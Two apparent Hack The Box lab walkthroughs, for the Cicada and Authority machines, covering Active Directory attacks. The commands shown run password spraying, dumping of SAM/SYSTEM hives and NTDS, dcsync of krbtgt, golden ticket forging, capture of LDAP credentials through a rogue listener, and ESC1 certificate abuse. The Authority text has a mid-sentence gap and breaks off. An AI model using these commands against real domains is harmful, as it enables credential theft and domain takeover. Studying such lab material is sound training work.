        "content": "Cicada Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Cicada How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Cicada/scans/nmap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:35:04 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT Nmap scan report for 10.129.115.238 Host is up (0.040s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds Initial thoughts: Got some classics, DNS, Kerberos, SMB \u0026amp; LDAP. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Cicada/scans/nmap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:35:12 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT Nmap scan report for 10.129.115.238 Host is up (0.039s latency). Not shown: 65522 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-31 16:38:14Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 53003/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (88%) Aggressive OS guesses: Microsoft Windows Server 2022 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-31T16:39:11 |_ start_date: N/A |_clock-skew: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 242.85 seconds Findings: RPC is enabled it seems. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Cicada/scans/ldap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:36:11 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.115.238 with SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=cicada,DC=htb CN=Configuration,DC=cicada,DC=htb CN=Schema,CN=Configuration,DC=cicada,DC=htb DC=DomainDnsZones,DC=cicada,DC=htb DC=ForestDnsZones,DC=cicada,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=cicada,DC=htb ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Nothing of note. RPC: I connect using anonymous session:\nrpcclient -U \u0026quot;\u0026quot; $box I connect using rpcclient using a null session:\nrpcclient -U \u0026quot;%\u0026quot; $box I am unable to enumerate either.\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares We can access using the guest account and can see there is an HR share there. netexec smb $box -u '' -p '' --shares No access via null share. Enumerating the HR Share: Connect to the share:\nsmbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\Public\u0026quot; Find a file:\nDownload file:\nFinding a hard-coded cred in \u0026ldquo;Notice from HR.txt\u0026rdquo;: Reading the file there is a hard-coded password in the file:\nNow we just need a username to enumerate further. I check the exif information of the file incase there is any creator information there:\nexiftool Notice\\ from\\ HR.txt There is none Using impacket-lookupsid: We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/guest@$machine.$domain -domain-sids +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password Password Spraying: With the new users list I password spray \u0026amp; get a hit for the user: michael.wrightson +Note+: We know it\u0026rsquo;s Michael\u0026rsquo;s password still as it does not have \u0026ldquo;Guest\u0026rdquo; written besides it. Why does guest appear beside all the names? If you haven\u0026rsquo;t seen this before check out this link. https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon Which says this:\nUsing a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you\u0026rsquo;re targetting is enabled.\nGuest account in SMB: SMB servers often allow users to connect as a Guest, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files. In this case authority.htb\\[user]:[Pass](Guest) indicates that the [user] account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources. So when you see \u0026ldquo;Guest\u0026rdquo; listed after users like authority.htb\\ryan, authority.htb\\tom, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB. 2. Foothold: Enumerating as michael.wrightson: We can see we have access to more shares: I check the shares but there is nothing of note. Enumerating users using RPC: As we have credentials we can perform credentialed RPC enumeration now.\nI connect using rpcclient:\nrpcclient -U $user $box Let\u0026rsquo;s list the users on the domain so we can get their RID\nenumdomusers Finding a password in the description field via RPC: Enumerating the users I find the user david.orelius has stored their password in clear text in the description field of their account: queryuser 0x454 Enumerating as david.orelius: We can see we have access to the DEV share as david: Finding a backup script in the DEV share. I connect to the DEV share and find the script Backup_script.ps1.\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\DEV\u0026quot; I download the script:\nget Backup_script.ps1 Finding credentials in the backup script: Looking in the script I find credentials for the user emily.oscars: Authenticating as emily.oscars: Authenticating as emily we can see she has access to more shares:\nI login via evil-winrm:\nevil-winrm -i $box -u $user -p $pass I grab the user flag:\n3. Privilege Escalation: Discovering we are part of the backup operators group: Checking emily\u0026rsquo;s group membership we can see she is part of the backup operators group: whoami /groups This means we will have the SebackupUpPrivilege: The SeBackupPrivilege allows us to backup the SAM \u0026amp; System registry hives. Backup Operators \u0026amp; SeBackupPrivilege Primer: Members of the Backup Operators \u0026amp; Server Operators get the theSeBackupPrivilege by default\nThis privilege will allow us to copy a file from a folder, even if there is no access control entry (ACE) for our user on the folder\u0026rsquo;s access control list (ACL) However, we cannot copy using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. This means we can use tools like reg save as it allows registry hives to be exported whilst bypassing ACLs\nKey Information About this privielge:\nAllows a process to read any file, regardless of the file\u0026rsquo;s permissions. Used primarily for backup applications that need access to all files. Bypasses standard file read permissions. Does not enable writing or deleting files, only reading. Typically assigned to backup software or administrative tasks. Security Considerations:\nHigh potential for abuse if granted to unauthorized applications or users. Should be closely monitored and restricted to trusted applications and personnel. 4. Ownership: Dumping Registry Hives \u0026amp; extracting creds using secretsdump: As mentioned previously we can use the reg save command to programatically copy the registry the hives and bypass ACL\u0026rsquo;s. The only reason we can do this is due to us having the SeBackupPrivilege\nI Dump the Hives:\nreg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV I transfer the hives back to my attack machine:\nExtract the secrets using impacket-secretsdump:\nimpacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL Login as the administrator using their hash:\nevil-winrm -i $box -u $user -H $hash Get our root flag:\n5. Persistence: Dumping NTDS.dit: I dump the ntds.dit using netexec: netexec smb $box -u $user -H $hash -M ntdsutil +Note+: Need to sort out these errors, this is a fresh VM so need to sort these python errors out. Creating a Kerberos Golden Ticket: I upload nc64.exe and mimikatz.exe via evil-winrm session:\nStart a reverse shell back to my attack machine:\nEvil-winrm does not play nice with mimikatz so we need standard reverse-shell. Extract SID \u0026amp; KRBTGT hashes:\nlsadump::dcsync /user:krbtgt /domain:cicada.htb Create ticket:\nkerberos::golden /domain:cicada.local /user:Administrator /sid:S-1-5-21-917908876-1423158569-3159038727 /rc4:[rc4hash] This has a typo (I can see now there is a trailing dash after the SID however it still won\u0026rsquo;t work. Read on) Download the .kirbi\nConvert .kirbi to .ccache:\nimpacket-ticketConverter ticket.kirbi admin.ccache Setup KRB5CCNAME var:\nexport KRB5CCNAME=./admin.ccache Try and connect:\nIt fails this is because I used the rc4 hash instead of the AES hash. So let\u0026rsquo;s generate a new ticket using the aesKey. I create a new ticket using ticketer.py:\npython ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator +Imporant Note+: You do not need the extra-pac parameter the following will work, I was just airing on the side of caution as I had read this issue: https://github.com/fortra/impacket/issues/1457 however the pull request was merged so should be resolved. This command will work (have also tested) python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator Connect with psexec:\nGolden Ticket Curiosities: When generating a ticket using ticketer.py I can create the ticket and it works fine.\npython3 ../ticketer.py -aesKey [Key] -domain-sid [SID] -domain $domain administrator However when using mimikatz to generate the ticket, I use the exact same key SID etc:\nkerberos::golden /domain:[domain] /user:administrator /sid:[SID] /aes256:[Key] I always get the error [-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked) when trying to use the mimikatz generated one. I have done various testing and unsure as to why.\nLessons Learned: What did I learn? This was mainly about enumeration. Enumerating well and thoroughly. What silly mistakes did I make? Frustratingly trying to determine the mimikatz ticket issue, it\u0026rsquo;s annoying me. So it\u0026rsquo;s not a mistake. Just grinding my gears until I figure it out. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Authority Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Authority How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Authority/scans/nmap 🍣 main 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:05:50 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 15:05 BST Nmap scan report for 10.129.229.56 Host is up (0.11s latency). Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8443/tcp open https-alt Nmap done: 1 IP address (1 host up) scanned in 677.96 seconds Initial thoughts: DNS, HTTP, kerberos \u0026amp; LDAP are all in th SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=authority,DC=htb CN=Configuration,DC=authority,DC=htb CN=Schema,CN=Configuration,DC=authority,DC=htb DC=DomainDnsZones,DC=authority,DC=htb DC=ForestDnsZones,DC=authority,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note, just standard entries. kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt No users found: HTTP 80: Standard holding page for IIS: HTTPS-ALT 8443: Discovering a password manager service: Looks to be hosting PWM:\nSome quick searching reveals this is an open source password self service application:\nhttps://github.com/pwm-project/pwm Config manager:\nDiscovering the user svc_pwm:\nUnfortunately it doesn\u0026rsquo;t look like there is much else we can do here at the moment so let\u0026rsquo;s continue to enumerate. However this is a good target and finding.\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares Guest session we get a hit \u0026amp; access to the development share. I test Null connection but it does not work. Enumerating the development share: I connect using smbclient:\nsmbclient -U $domain\\\\guest \\\\\\\\$box\\\\Development There is a folder called \u0026ldquo;Automation\u0026rdquo; I use smbget to download it:\nsmbget -U $domain/guest --recursive \u0026quot;smb://$box/Development\u0026quot; Looking I can see it\u0026rsquo;s a folder containing, Ansible information. Ansible is an open-source automation tool used for configuration management, application deployment, and task automation across multiple systems without requiring agents. Meaning that it\u0026rsquo;s possible we may find some hard-coded creds etc. Finding Hard-Coded Creds \u0026amp; Hashes Ansible files: Discovering the CA Admin Username/Email: Finding the CA email: grep -r \u0026quot;admin\u0026quot; Ansible Discovering the Ansible Username: Hard Coded TomCat Creds: I run grep recursivley to search for passwords: grep -r \u0026quot;pass\u0026quot; Ansible Tomcat Creds: There is currently no TomCat Instance I can find running, unless it\u0026rsquo;s running internally. However this is a good finding. Ansible Hashes: Ansible Vault Encoded Creds: Looking through the files further I find ansible encoded passwords in the /Automation/Ansible/PWM/defaults/main.yml file This is good as it\u0026rsquo;s in the subfolder PWM which is the Password Manager service we found on 8443 earlier. Some quick searching \u0026amp; I find this article by Ben Grewell about cracking ansible hashes. Cracking Ansible Vault Hashes Using Ansible2John \u0026amp; John The Ripper: Converting Ansible Vault Hashes to John format using ansible2john: +Important+: For some reason ansible2john will note be able to process \u0026amp; convert more than 1 hash per file. This means each hash has to be placed in a separate file \u0026amp; then converted. I am telling you this as I WASTED so much time trying to debug this. Place each hash in it\u0026rsquo;s own file: Run ansible2john on each file: ansible2john ansible1.hashes \u0026gt; ansible.hashes Cracking Ansible Vault Hashes Using John: Now we have our converted hashes we can use john to attempt to crack them:\njohn –wordlist=~/Wordlists/rockyou.txt ansbile.hashes They crack. I try them in the PWM Page, but they are rejected:\n+Note+: Jumping back to Ben\u0026rsquo;s Article we can see that we actually need to decrypt the vault passwords with the password we have just found.\nUsing Ansible Vault to decrypt the hashes. Install Ansible Package:\nIf you do not have ansible installed you will need to install it to be able to use ansible-vault. On debian (kali) install with: sudo apt install ansible-core Preparing our hashes:\nAgain ansible-vault is sassy if you have more than 1 hash in the file, so it\u0026rsquo;s better to just decrypt each file: Decrypting ansible hashes using ansible-vault:\nansible-vault view Vault* So we now have the password for the user svc_pwm as well as the ldap password\nRe-cap of process ansible hash cracking process: We needed to convert each of the ansible hashes to the crackable format using ansible2john and placing each hash in it\u0026rsquo;s own file. We then cracked those converted hashes to retrieve the vault password. We can then decrypt the original hashes using the retrieved password with ansible-vault Logging into PWM: I attempt to login to the main page using our new found creds but get the below error:\nI then login to the configuration page:\nI find the LDAP Proxy username:\nI attempt to authenticate with this user and the found passwords but it fails. I click Cancel (just to see what happens)\nI am taken to this page where we can download the Configuration: I download it Looking at the file we can see a configPasswordHash:\nI check it on https://hashes.com Searching hashcats website we can see it\u0026rsquo;s mode 3200:\nI run it through hashcat:\nhashcat -m 3200 PWMHash ~/Wordlists/rockyou.txt +Note+: Future bloodstiller here, this did not crack or lead anywhere (save yourself some time) Whilst that runs looking back on that page we can actually access the DB:\nClicking it enables us to download the DB: I download it I open it in sqlitebrowser:\nsqlitebrowser PWM-Local.DB It asks for a key but none of the retrieved keys we have work: Stealing LDAP Credentials VIA PWM: Looking back in the configuration for the PWM service I discover we can add ldap endpoints. This means we can have the victim authenticate to us and steal the credentials.\nHave the victim connect back to us:\nWith PWM if we can access the config page we can enter our URL: Ensure we use ldap not ldaps or it will be encrypted and we will just cipher text. Setup Listening Server:\nnc -nvlp 636 +Note+: No special type of server needs to be used just a server and port to listen on. Initiate Connection:\nCapture Creds:\nI verify with netexec:\nnetexec ldap $domain -u $user -p $pass 2. Foothold: Re-running ldapire now that we have creds to enumerate users and groups: As we have credentials I re-run my ldap enumeration tool: ldapire python3 ~/Desktop/WindowsTools/ldapire.py $box -u $user -p $pass I check the description fields for users \u0026amp; groups as well as the entries but there is nothing of note: We do have a nice list of groups and users now: Connecting via evil-winrm as svc_ldap: evil-winrm -i $box -u $user -p $pass\nGet our user flag:\nDoing a bloodhound capture using SharpHound: I upload SharpHound.exe using evil-winrm:\nThen run a capture:\n.\\SharpHound.exe all I download the zip:\ndownload 20241024093228_BloodHound.zip Reading the bloodhound results: We can see we have the ability to enroll in all of these certificates. Enumerating the Certificate Authority with certipy-ad (CA): As we saw CA information earlier in the Automation share and we have the ability to enroll using certain certificates, I use certipy-ad to enumerate if there are any vulnerable certificates.\ncertipy-ad find -vulnerable -enabled -u $user@$domain -p $pass -dc-ip $box -debug Reading the results we can see that there is a vulnerable certificate: \u0026amp; we can use the ESC1 attack chain:\nLooking at who can enroll the cert we see it is all groups:\nThis unfortunately was not listed as any of the certs we could enroll in as our current user. However it does say \u0026ldquo;Domain Computers\u0026rdquo; can so if we can create a computer \u0026amp; add it to the domain we should be able to use that with the ESC1 attack. 3. Privilege Escalation: Enumerating MachineAccountQuota using netexec: By default, all users can add up to 10 computers to a domain. (You read that right. This is called the MachineAccountQuota or MAQ). This setting can present a significant security risk in Active Directory environments if left unchecked. MachineAccountQuota Primer: Default Behavior:\nPurpose: Limits the number of machine accounts (computers) a non-administrative user can join to a domain. Value: The MachineAccountQuota has been set to 10 by default since Windows 2000 +Any authenticated domain user can leverage this quota+: No special permissions are required beyond basic domain user rights Default Value: By default, users in the \u0026ldquo;Authenticated Users\u0026rdquo; group can create 10 computer accounts in Active Directory. Location: Managed via Active Directory settings and group policies. Security Implications:\nAttackers can potentially add rogue machines to a domain, which may be used for privilege escalation or lateral movement. Think Resource Based Constrained Delegation attacks: Each computer account could potentially be used for lateral movement or persistence. Rogue computer accounts can be leveraged for relay attacks or resource access Mitigation Strategies:\nReduce the MAQ value to 0 for enhanced security Implement a formal process for adding computers to the domain Monitor computer account creation events (Event ID 4741 ) Regularly audit computer accounts for suspicious entries How to Modify MAQ using AD cmdlet: Set-ADDomain -Identity yourdomain.com -Replace @{\u0026quot;ms-DS-MachineAccountQuota\u0026quot;=\u0026quot;0\u0026quot;} How to enumerate MAQ value: Using ldap:\ndsquery * \u0026quot;DC=domain,DC=com\u0026quot; -scope base -attr ms-DS-MachineAccountQuota +Note+: As we can see we can add 10 machines as expected. Using netexec:\nnetexec ldap $box -u $user -p $pass -M maq Using AD Powershell Module:\nGet-ADDomain | Select-Object -ExpandProperty MaxComputers +Note+: This system does not have the AD cmdlet available however I wanted to include it. Creating a computer with impacket-addcomputer: As we know we can add a computer we can use impacket-addcomputer to do it.\nCreate the computer using Impacket:\nimpacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap I verify the computer was made using PowerView:\nGet-AdComputer -identity bloodstiller Note: be patient, this can hang for a number of seconds! Using certipy-ad \u0026amp; ESC1 Attack Chain to elevate privileges to Administrator: I retrieve the vulnerable certificate name:\nCorpVPN I sync my clock with the target:\nsudo ntpdate -s $domain I request a cert:\ncertipy-ad req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain -dns $domain +Note+: How we have used the name of the certificate we found in step 1 CorpVPN I get the below errors: Troubleshooting the issue:\nI tried so many different variations of this to try and get it to work. So many different certipy-ad commands as I was convinced I had gotten the syntax wrong. No matter what I did this kept failing. I have done this attack path before so know the commands etc are right. https://bloodstiller.com/walkthroughs/escape-box/#using-esc1-attack-chain-to-elevate-privileges-to-administrator After some searching online I find the below github issue thread. https://github.com/ly4k/Certipy/issues/158 \u0026amp; this comment: Using addcomputer.py to start the attack chain again: Let\u0026rsquo;s start this process over using addcomputer.py:\nGet the file:\nwget https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/addcomputer.py Add the computer:\npython3 addcomputer.py -computer-name 'bloodstiller' -computer-pass 'b100dstill3r' -dc-ip $dcip $domain/svc_ldap Install certipy-ad via pipx:\npipx install certipy-ad Get ticket\ncertipy req -username bloodstiller$ -password $pass -ca AUTHORITY-CA -dc-ip $dcip -template CorpVPN -upn administrator@$domain -dns $domain -debug Attempt to request a TGT and get the below erorr:\ncertipy auth -pfx administrator_authority.pfx -dc-ip $box 4. Ownership: Understanding the KDC_ERR_PADATA_TYPE_NOSUPP error: Looking online we can find the following article: https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d Which says this: What does this actually mean though? It means that PKINIT authentication has failed.\nWhen PKINIT authentication fails, it\u0026rsquo;s often because either:\nPKINIT is not enabled on the Domain Controller, or The certificate being used lacks the required Smart Card Logon Extended Key Usage (EKU). This EKU requirement is a common issue when the PKI is not properly configured. So what\u0026rsquo;s a PKINIT and an EKU…glad you asked.\nPublic Key Cryptography for Initial Authentication in kerberos (PKINIT) Primer: PKINIT is a kerberos extension that allows users to authenticate to a kerberos Key Distribution Center (KDC) using X.509 public key certificates instead of the traditional kerberos username and password, \u0026amp; guess what we have an X.509 certificate that certipy extracted for us.\nHow PKINIT Works: The PKINIT process works as follows: The client initiates a kerberos pre-authentication request, including their X.509 certificate. The KDC verifies the client\u0026rsquo;s certificate and extracts the necessary information, such as the client\u0026rsquo;s public key. The KDC and client then engage in a series of cryptographic exchanges to authenticate the client and establish a session key. Once authenticated, the client can request kerberos tickets (e.g., TGTs) to access resources and services. PKINIT Requirements For PKINIT to work, several requirements must be met: The client\u0026rsquo;s X.509 certificate must be trusted by the KDC. The client\u0026rsquo;s certificate must have the appropriate Extended Key Usage (EKU) set, typically the \u0026ldquo;Smart Card Logon\u0026rdquo; EKU. The KDC must be configured to support PKINIT and have the necessary certificate trust chain. The client and KDC must have a shared understanding of the supported cryptographic algorithms and protocols. The main benefits of PKINIT include: Enhanced security: PKINIT leverages the security of public key cryptography, providing an alternative to password-based authentication. Improved user experience: Users can authenticate using their existing PKI-based credentials, such as smart cards or software certificates, without having to manage separate kerberos credentials. Support for single sign-on: PKINIT enables users to obtain kerberos tickets using their PKI credentials, facilitating single sign-on across applications and services. PKINIT Resources: 